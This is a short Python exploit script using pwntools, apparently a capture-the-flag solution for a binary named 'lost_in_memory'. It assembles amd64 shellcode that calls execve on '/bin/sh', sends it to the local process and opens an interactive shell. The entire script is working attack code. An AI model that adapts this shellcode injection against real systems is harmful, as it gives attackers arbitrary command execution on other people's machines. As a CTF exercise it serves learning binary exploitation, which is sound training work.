from pwn import *

context.arch = "amd64"

COMMANDS = '''
b *main
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
        r = gdb.debug("./lost_in_memory", gdbscript=COMMANDS)
    else:
        r = process("./lost_in_memory")


shellcode = '''
xor rax, rax
push rax
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
syscall
'''

shellcode_c = asm(shellcode)
r.send(shellcode_c)

r.interactive()